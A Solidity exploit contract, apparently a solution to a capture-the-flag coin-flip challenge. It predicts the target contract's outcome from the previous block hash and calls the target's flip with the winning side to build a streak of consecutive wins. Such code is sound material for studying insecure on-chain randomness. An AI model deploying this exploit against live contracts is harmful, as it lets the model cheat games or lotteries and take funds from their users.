// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import './chall.sol';
contract Attack {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public Contract;

  constructor(address coinFlip) public {
    consecutiveWins = 0;
    Contract = CoinFlip(coinFlip);
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    bool result = Contract.flip(side);
    if (result == true) {
      consecutiveWins++;
    }
    else  {
      consecutiveWins = 0;
    }
    return result;
  }
  function getWins() public view returns(uint256){
    return consecutiveWins;
  }
}